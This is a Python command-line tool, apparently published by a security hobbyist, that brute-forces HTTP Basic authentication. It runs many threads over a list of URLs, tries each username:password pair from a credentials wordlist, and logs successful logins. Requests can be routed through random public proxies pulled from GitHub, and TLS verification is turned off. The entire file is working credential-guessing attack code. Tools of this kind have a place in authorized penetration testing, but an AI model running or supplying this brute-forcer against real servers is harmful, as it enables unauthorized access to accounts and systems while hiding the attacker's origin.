#!/usr/bin/env python
# By Abdulrahman-Kamel
# Version 1.2

# usage : python3 http_auth.py --urls 401_http_list.txt --sleep 3 -o file/to/save.txt --view

import requests
import argparse
import urllib3 
import random
import time
import base64
import os
from sys import exit
from concurrent.futures import ThreadPoolExecutor as PoolExecutor


#======================= Start Arguments ====================
# arguments
parser_arg_menu = argparse.ArgumentParser(prog='tool', formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=40)
)
parser_arg_menu.add_argument(
"-u" , "--url" , help="unique url to testing",
metavar=""
)
parser_arg_menu.add_argument(
"-us" , "--urls" , help="File contain urls Ex: urls.txt",
metavar=""
)
parser_arg_menu.add_argument(
"-c" , "--creds" , help="File contain http auth creds",
metavar=""
)
parser_arg_menu.add_argument(
"-p" , "--proxies" , help="File contains proxy:port",
metavar=""
)
parser_arg_menu.add_argument(
"-t", "--threads" , help="Thread number to MultiProccess [speed tool] , Default 30",
metavar=""
)
parser_arg_menu.add_argument(
"-T", "--timeout" , help="Timeout if delay request, Default is 1",
metavar=""
)
parser_arg_menu.add_argument(
"-s", "--sleep" , help="sleep after every request",
metavar=""
)
parser_arg_menu.add_argument(
"-v", "--view" , help="display request sended",
action="store_true"
)
parser_arg_menu.add_argument(
"-o", "--output" , help="save success results in file",
metavar=""
)
arg_menu      = parser_arg_menu.parse_args()
max_threads   = int(arg_menu.threads)   if arg_menu.threads else int(30)
max_sleep     = int(arg_menu.sleep)     if arg_menu.sleep else int(1)
max_timeout   = int(arg_menu.timeout)   if arg_menu.timeout else int(30)

#======================= End Arguments  =====================

class color:
    header = '\035[90m'
    blue = '\033[94m'
    green = '\033[92m'
    yellow = '\033[93m'
    red = '\033[91m'
    end = '\033[0m'
    bold = '\033[1m'
    underLine = '\033[4m'
    notic = '\033[5;91m'


banner ='\033[91m'+"""
           _         _       _           _                             _  __                    _ 
     /\   | |       | |     | |         | |                           | |/ /                   | |
    /  \  | |__   __| |_   _| |_ __ __ _| |__  _ __ ___   __ _ _ __   | ' / __ _ _ __ ___   ___| |
   / /\ \ | '_ \ / _` | | | | | '__/ _` | '_ \| '_ ` _ \ / _` | '_ \  |  < / _` | '_ ` _ \ / _ \ |
  / ____ \| |_) | (_| | |_| | | | | (_| | | | | | | | | | (_| | | | | | . \ (_| | | | | | |  __/ |
 /_/    \_\_.__/ \__,_|\__,_|_|_|  \__,_|_| |_|_| |_| |_|\__,_|_| |_| |_|\_\__,_|_| |_| |_|\___|_|"""+'\033[0m'+'\n\n'+'\t'*4+ 'Github: '+'\033[96m'+ '  github.com/Abdulrahman-Kamel'+'\033[0m'+'\n'+'\t'*4+ 'Linkedin: '+'\033[96m'+ 'linkedin.com/in/abdulrahman-kamel'+'\033[0m \n'


# disaple ssl checks
urllib3.disable_warnings()

# update wordlists/proxies-raw.txt
def update_proxiesFile():
    try: os.remove('wordlists/proxies-raw.txt')
    except: pass
    try:
        response = requests.get('https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt', allow_redirects=True)
        if str(response.status_code)[0] ==  '2':
            open('wordlists/proxies-raw.txt', 'wb').write(response.content)
    except Exception as er:
        print('\nMissing configs/proxies-raw.txt, can`t download it\nplease download from this repo: https://github.com/clarketm/proxy-list\nThen move here by the same name configs/proxies-raw.txt\n')

def output(save, line):
    a_file = open(save, 'a+')
    a_file.writelines(line)


def _filter(value):
    if value is not None:

        if os.path.isfile(value) == True:
            with open(value) as _file:
                value = [line.rstrip() for line in _file]

        elif type(value) == str and ',' not in value:
            value = value.split(' ')

        elif ',' in value:
            value = value.split(',')
        
        else:
            value = None
    return value


# choose random proxy
arg_proxies = _filter('wordlists/proxies-raw.txt') if arg_menu.proxies == 'default' else _filter(arg_menu.proxies)
randomProxy = random.choices(arg_proxies,k=1)[0] if arg_proxies != None else None 
proxy = {"http": randomProxy, "https": randomProxy}

# sorting urls&filter
_urls = _filter(arg_menu.urls) if arg_menu.urls else _filter(arg_menu.url) #if arg_menu.url else None

def run(single_url):

    auth_creds = open(arg_menu.creds if arg_menu.creds else 'wordlists/default-creds.txt' , 'r')
    try:
        for creds in auth_creds:

            creds = creds.strip()
            base64_creds= base64.b64encode(creds.encode('ascii')).decode('ascii')

            response = requests.post(single_url, verify=False, timeout=max_timeout, headers = {"Authorization" : "Basic %s" % base64_creds}, proxies=proxy if arg_menu.proxies else None)
            
            if response.status_code == 503:
                print(color.red + "The server ["+response.url+"] Response 503 [unable to handle the request]" + color.end)
                break

            if arg_menu.view:
                print(color.green + 'Failed try: '+str(response.status_code)+' ['+ creds +'] ' + response.url + '\t' +color.end)

            if str(response.status_code)[0] in ['2', '3']:
                print(color.red + '[+] Success '+color.end +color.red+ creds +color.end+ ' '*3 +color.green+ response.url + '\t' + str(response.status_code)+ color.end)
                if arg_menu.output:
                    output(arg_menu.output , '[+] '+ creds + ' '*3 + response.url + ' [' +str(response.status_code)+ ']\n')

            time.sleep(max_sleep)

    except Exception as er:
        print(er)


if __name__ == "__main__":

    if not (arg_menu.urls or arg_menu.url):
        print("-us, --urls OR -u, --url Required")
        exit(1)

    print(banner)

    # update default proxies file
    update_proxiesFile()

    with PoolExecutor(max_workers=max_threads) as executor:
        for _ in executor.map(run, _urls):
            pass

    # close creds file
    open(arg_menu.creds , 'r').close()

    # close urls file
    open(arg_menu.urls , 'r').close()
